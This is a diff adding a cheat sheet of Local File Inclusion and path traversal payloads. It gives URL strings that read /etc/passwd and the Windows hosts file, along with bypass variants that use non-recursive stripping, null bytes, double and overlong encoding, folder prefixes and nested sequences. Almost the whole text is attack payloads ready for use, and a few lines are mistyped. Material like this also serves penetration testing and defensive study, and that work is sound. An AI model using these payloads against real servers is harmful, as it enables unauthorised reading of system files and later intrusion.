@@ -1,0 +1,51 @@
+Local File Inclusion (LFI)/ Path Traversal
+-------------------------------------------
+Basic usage on URL:
+http://example.com/example.php?=image.png     >>>>>  unmodified link
+
+Basic Payload for linux >> “../../../../etc/passwd”
+http://example.com/example.php?=../../../../../etc/passwd     >>>>> modified link
+
+Basic Paylaod for Windows >> “..\..\..\..\..\”
+http://example.com/example.php?=..\..\..\..\..\windows\system32\drivers\etc\hosts     >>>>> modified link
+
+
+
+
+Paylaods for Bypass
+--------------------
+Traversal sequences stripped non-recursively:
+http://example.com/index.php?page=....//....//....//etc/passwd 
+http://example.com/index.php?page=....\/....\/....\/etc/passwd
+http://some.domain.com/static/\..\..\..\..\..\..\..\/etc/passwd
+
+
+Null byte (%00) Bypass
+-----------------------
+Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."png")
+http://example.com/index.php?page=../../../etc/passwd%00
+The png extention don’t add.(This is solved since PHP 5.4)
+
+
+
+Encoding
+-----------
+http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
+http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+
+
+
+From existent folder
+---------------------
+When back-end is checking the folder path:
+http://example.com/index.php?page=images/../../../../../etc/passwd
+For this example, the folder path is checked by the server(”images”).
+
+Intertwined Paths
+------------------
+You can use nested cross strings like ....// or ....\/. These revert to simple crossed strings when the inner string is removed.
+http://example.com/index.php?page=images….//….//….//...etc/passwd
+
+
